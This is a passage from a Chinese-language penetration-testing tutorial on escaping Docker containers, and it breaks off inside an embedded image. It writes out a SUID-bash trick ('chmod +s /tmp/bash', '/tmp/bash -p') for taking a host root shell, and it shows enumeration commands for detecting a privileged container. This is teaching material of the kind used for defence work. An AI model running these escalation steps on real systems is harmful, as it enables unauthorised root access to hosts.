<p>因为我们挂载了宿主机文件系统，所以我们对文件或目录所做的任何更改也将反映在宿主机的文件系统上。</p>
<p>不过，事实是，我们仍在 docker 容器中。所以，让我们看看如何才能摆脱困境，在真正的主机上获得 root！</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="33突破-docker-容器以获取宿主机-root-权限"><strong><div id="id3.3">3.3、突破 Docker 容器以获取宿主机 Root 权限</div></strong><a href="#33突破-docker-容器以获取宿主机-root-权限" class="hash-link" aria-label="33突破-docker-容器以获取宿主机-root-权限的直接链接" title="33突破-docker-容器以获取宿主机-root-权限的直接链接">​</a></h4>
<p>由于我们已经挂载了宿主机的文件系统，因此突破 docker 容器将是轻而易举的。</p>
<p>我们可以使用一些很好的技术来突破这个容器，但是在这个例子中，我们将通过制作 SUID bash 二进制文件来提升到 root 权限。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cp /bin/bash /tmp/bash</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">chmod +s /tmp/bash</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ls -l /tmp</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174927451-1930343053-dea0a9cfc6eca3327606be01bd589629.png" width="881" height="188" class="img_ev3q"></p>
<p>Amazing！我们可以看到 SUID bash 二进制文件已在 /tmp 目录中创建。</p>
<p>现在，当我们从容器中退出时，应该会在实际主机上看到相同的 SUID bash 二进制文件。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174927729-1413269896-0fd4d1dc0e94114959ebea6d919b052d.png" width="883" height="144" class="img_ev3q"></p>
<p>确认文件位于宿主机上后，我们只需运行以下命令即可进入 root shell：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/tmp/bash -p</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174927698-566137947-3097490b524033d8b21e79a803acc085.png" width="608" height="336" class="img_ev3q"></p>
<p>Awesome！我们成功脱离了 docker 容器，并在宿主机上获得了 root shell。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="4场景2直接在特权容器中立足"><strong><div id="id4">4、场景2：直接在特权容器中立足</div></strong><a href="#4场景2直接在特权容器中立足" class="hash-link" aria-label="4场景2直接在特权容器中立足的直接链接" title="4场景2直接在特权容器中立足的直接链接">​</a></h2>
<p>上一种场景中，我们先是在外部利用主机并获得了一个普通用户 shell。但这一次，当我们站稳脚跟时，似乎立刻就获得了 root ？</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174927552-473431604-5f7363fd0cae3ba38a96b1f8f6e0c19d.png" width="501" height="150" class="img_ev3q"></p>
<p>此时此刻，我们还不确定自己是否在容器中。</p>
<blockquote>
<p>在此示例中，我们使用 netcat 立足，因此我们应该像之前一样尝试升级到完整的 TTY。</p>
</blockquote>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174928681-161907598-8f53d6558e57631b34a9c92ac94f161e.png" width="565" height="243" class="img_ev3q"></p>
<p>好吧，既然我们是 root，我们不妨看看是否可以查看 <strong>/root</strong> 目录中的文件。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174929107-1012511773-72ec22904f111428e241cc316ed57bac.png" width="417" height="111" class="img_ev3q"></p>
<p>有趣的是，我们在这里什么也没看到，这时候我们就应该开始怀疑自己是不是在一个 docker 容器中。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="41确认处于-docker-容器中"><strong><div id="id4.1">4.1、确认处于 Docker 容器中</div></strong><a href="#41确认处于-docker-容器中" class="hash-link" aria-label="41确认处于-docker-容器中的直接链接" title="41确认处于-docker-容器中的直接链接">​</a></h4>
<p>我们可以使用几种方法来检查自己是否处于 docker 容器中。</p>
<p>首先，12 个随机数字/字母组合作为主机名是一个常见的标志，表明我们位于 docker 容器中。</p>
<p>另一个要找的东西是文件系统根目录下的 .dockerenv 文件。如果我们看到了这个文件，那么很有可能我们是在一个容器中。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ls -la /</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174929267-367646558-3dfc4bd54c02a7ee835363767b6aa89e.png" width="524" height="427" class="img_ev3q"></p>
<p>最后，确认我们是否处于 docker 容器中的最佳方法是检查 cgroup 进程。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cat /proc/1/cgroup</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174928521-803126330-ca844070cc2c27c17e1c68ae404c69ea.png" width="746" height="256" class="img_ev3q"></p>
<p>看到所有属于 docker 的控制组，就能确认我们确实是在一个 docker 容器中。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="42确认这是一个特权容器"><strong><div id="id4.2">4.2、确认这是一个特权容器</div></strong><a href="#42确认这是一个特权容器" class="hash-link" aria-label="42确认这是一个特权容器的直接链接" title="42确认这是一个特权容器的直接链接">​</a></h4>
<p>由于直接立足于 docker 容器，因此我们这次就不能使用 <strong>docker run</strong> 命令进行漏洞利用。相反，我们必须从 docker 容器内部进行枚举以确定是否设置了 <strong>–privileged</strong> 标志。</p>
<p>有很多方法可以判断在启动容器时是否使用了 –privileged 标志，从 <strong>fdisk</strong> 命令开始。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">fdisk -l | grep -A 10 -i &quot;device&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174927277-2035469563-3f465e6916037b1cd521cca4defae2ac.png" width="508" height="103" class="img_ev3q"></p>
<p>由于我们能够列出设备，因此基本上可以确认我们是在一个有权限的容器中。在非特权容器中，这条命令将被拒绝执行。</p>
<p>检查我们是否处于特权容器中的另一种方法是检查状态进程中的 seccomp 值。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cat /proc/1/status | grep -i &quot;seccomp&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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